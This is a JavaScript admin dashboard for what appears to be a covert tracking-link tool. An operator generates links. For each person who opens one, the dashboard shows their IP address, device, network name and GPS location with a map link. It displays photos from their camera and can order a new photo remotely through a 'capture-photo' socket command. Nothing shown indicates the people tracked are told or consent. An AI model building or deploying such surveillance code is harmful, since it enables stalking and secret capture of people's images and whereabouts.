let socket;
let currentVisitorId = null;

// Connect to Socket.io
socket = io();

// Check if admin is logged in
fetch('/api/visitors')
    .then(response => {
        if (response.status === 401) {
            window.location.href = '/';
        }
        return response.json();
    })
    .catch(() => {
        window.location.href = '/';
    });

// Socket event listeners
socket.on('visitor-connected', (visitor) => {
    loadVisitors();
    updateStats();
});

socket.on('visitor-disconnected', (visitorId) => {
    loadVisitors();
    updateStats();
});

socket.on('camera-data', (data) => {
    if (currentVisitorId === data.visitorId) {
        showVisitorDetails(currentVisitorId);
    }
});

socket.on('location-data', (data) => {
    if (currentVisitorId === data.visitorId) {
        showVisitorDetails(currentVisitorId);
    }
});

// Load visitors
function loadVisitors() {
    fetch('/api/visitors')
        .then(response => response.json())
        .then(visitors => {
            displayVisitors(visitors);
        });
}

// Display visitors
function displayVisitors(visitors) {
    const container = document.getElementById('visitorsList');
    container.innerHTML = '';
    
    visitors.forEach(visitor => {
        const card = document.createElement('div');
        card.className = 'visitor-card';
        card.innerHTML = `
            <div class="visitor-header">
                <div>
                    <strong>ID: ${visitor.id.substring(0, 8)}</strong>
                    <div style="font-size: 14px; color: #666;">
                        ${visitor.deviceName || 'Unknown Device'} 
                        ${visitor.ip ? `• IP: ${visitor.ip}` : ''}
                    </div>
                </div>
                <span class="status ${visitor.connected ? 'active' : 'inactive'}">
                    ${visitor.connected ? 'Active' : 'Inactive'}
                </span>
            </div>
            <div style="margin-top: 10px; font-size: 14px;">
                Created: ${new Date(visitor.createdAt).toLocaleString()}
                ${visitor.lastCameraUpdate ? `• Last Photo: ${new Date(visitor.lastCameraUpdate).toLocaleString()}` : ''}
            </div>
            <button onclick="showVisitorDetails('${visitor.id}')" class="camera-btn">
                View Details
            </button>
        `;
        container.appendChild(card);
    });
}

// Show visitor details
function showVisitorDetails(visitorId) {
    currentVisitorId = visitorId;
    const container = document.getElementById('detailsContent');
    const detailsDiv = document.getElementById('visitorDetails');
    
    fetch(`/api/visitor/${visitorId}`)
        .then(response => response.json())
        .then(visitor => {
            detailsDiv.style.display = 'block';
            container.innerHTML = `
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                    <div>
                        <h3>Visitor Information</h3>
                        <p><strong>ID:</strong> ${visitor.id}</p>
                        <p><strong>Device:</strong> ${visitor.deviceName || 'Not available'}</p>
                        <p><strong>IP Address:</strong> ${visitor.ip || 'Not available'}</p>
                        <p><strong>Network:</strong> ${visitor.networkName || 'Not available'}</p>
                        <p><strong>Status:</strong> ${visitor.connected ? 'Online' : 'Offline'}</p>
                        <p><strong>Joined:</strong> ${new Date(visitor.createdAt).toLocaleString()}</p>
                    </div>
                    <div>
                        <h3>Location</h3>
                        ${visitor.location ? `
                            <p><strong>Latitude:</strong> ${visitor.location.lat}</p>
                            <p><strong>Longitude:</strong> ${visitor.location.lng}</p>
                            <a href="https://www.google.com/maps?q=${visitor.location.lat},${visitor.location.lng}" 
                               target="_blank">View on Map</a>
                        ` : '<p>Location not available</p>'}
                        
                        <h3 style="margin-top: 20px;">Camera Access</h3>
                        ${visitor.cameraData ? `
                            <img src="${visitor.cameraData}" alt="Visitor Photo" class="camera-image">
                            <br>
                            <button onclick="capturePhoto('${visitor.id}')" class="camera-btn">
                                Take New Photo
                            </button>
                        ` : `
                            <button onclick="capturePhoto('${visitor.id}')" class="camera-btn">
                                Request Camera Access
                            </button>
                        `}
                    </div>
                </div>
            `;
        });
}

// Capture photo from visitor
function capturePhoto(visitorId) {
    socket.emit('admin-command', {
        visitorId: visitorId,
        command: 'capture-photo'
    });
    
    // Show loading message
    const container = document.getElementById('detailsContent');
    container.innerHTML += '<p style="color: #667eea;">Requesting photo capture...</p>';
}

// Generate new link
function generateLink() {
    fetch('/generate-link', {
        method: 'POST'
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            const linkDisplay = document.getElementById('linkDisplay');
            const linkInput = document.getElementById('generatedLink');
            linkDisplay.style.display = 'block';
            linkInput.value = data.link;
        }
    });
}

// Copy link to clipboard
function copyLink() {
    const linkInput = document.getElementById('generatedLink');
    linkInput.select();
    document.execCommand('copy');
    alert('Link copied to clipboard!');
}

// Update dashboard statistics
function updateStats() {
    fetch('/api/visitors')
        .then(response => response.json())
        .then(visitors => {
            document.getElementById('totalVisitors').textContent = visitors.length;
            document.getElementById('activeVisitors').textContent = 
                visitors.filter(v => v.connected).length;
            document.getElementById('totalLinks').textContent = visitors.length;
        });
}

// Logout
function logout() {
    window.location.href = '/';
}

// Initial load
loadVisitors();
updateStats();

// Auto-refresh every 10 seconds
setInterval(() => {
    loadVisitors();
    updateStats();
}, 10000);